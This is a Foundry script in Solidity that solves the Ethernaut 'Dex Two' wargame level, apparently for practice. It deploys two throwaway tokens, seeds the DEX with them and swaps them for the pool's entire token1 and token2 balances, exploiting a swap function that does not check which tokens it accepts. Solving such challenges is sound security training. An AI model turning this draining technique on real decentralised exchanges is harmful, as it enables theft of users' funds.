// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { IDexTwo } from "ethernaut/23-dex-two/IDexTwo.sol";
import { SwappableTokenTwo } from "ethernaut/23-dex-two/DexTwo.sol";

contract DexTwoScript is Script {
    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address dexAddr = vm.envAddress("L23_DEX_TWO_ADDRESS");
        IDexTwo dex = IDexTwo(dexAddr);

        // Step 1: deploy 2 new `SwappableTokenTwo`
        SwappableTokenTwo token3 = new SwappableTokenTwo(
            dexAddr,
            "Token 3",
            "TKN3",
            10000
        );
        SwappableTokenTwo token4 = new SwappableTokenTwo(
            dexAddr,
            "Token 4",
            "TKN4",
            10000
        );
        address tkn3 = address(token3);
        address tkn4 = address(token4);

        // Step 2: deploy attacker
        address tkn1 = dex.token1();
        address tkn2 = dex.token2();
        address swapper = vm.addr(deployerPrivateKey);

        // Step 3: approve and transfer 100 TKN3 & TKN4 to dex
        token3.approve(dexAddr, 100);
        token3.transfer(dexAddr, 100);
        token4.approve(dexAddr, 100);
        token4.transfer(dexAddr, 100);

        console.log("*** Before any swap");
        console.log("dex balances:");
        console.logUint(dex.balanceOf(tkn1, dexAddr));
        console.logUint(dex.balanceOf(tkn2, dexAddr));
        console.logUint(dex.balanceOf(tkn3, dexAddr));
        console.logUint(dex.balanceOf(tkn4, dexAddr));
        console.log("swapper balances:");
        console.logUint(dex.balanceOf(tkn1, swapper));
        console.logUint(dex.balanceOf(tkn2, swapper));
        console.logUint(dex.balanceOf(tkn3, swapper));
        console.logUint(dex.balanceOf(tkn4, swapper));

        console.log("*** 1st swap");
        // Step 4: swap 100 TKN3 for the equivalent TKN1
        dex.swap(address(tkn3), tkn1, 100);
        // Step 5: swap 100 TKN4 for the equivalent TKN2
        dex.swap(address(tkn4), tkn2, 100);
        console.log("dex balances:");
        console.log("+ tkn1:");
        console.logUint(dex.balanceOf(tkn1, dexAddr));
        console.log("+ tkn2:");
        console.logUint(dex.balanceOf(tkn2, dexAddr));
        console.log("+ tkn3:");
        console.logUint(dex.balanceOf(tkn3, dexAddr));
        console.logUint(token3.balanceOf(dexAddr));
        console.log("+ tkn4:");
        console.logUint(dex.balanceOf(tkn4, dexAddr));
        console.logUint(token4.balanceOf(dexAddr));
        console.log("swapper balances:");
        console.log("+ tkn1:");
        console.logUint(dex.balanceOf(tkn1, swapper));
        console.log("+ tkn2:");
        console.logUint(dex.balanceOf(tkn2, swapper));
        console.log("+ tkn3:");
        console.logUint(token3.balanceOf(swapper));
        console.log("+ tkn4:");
        console.logUint(token4.balanceOf(swapper));

        vm.stopBroadcast();
    }
}
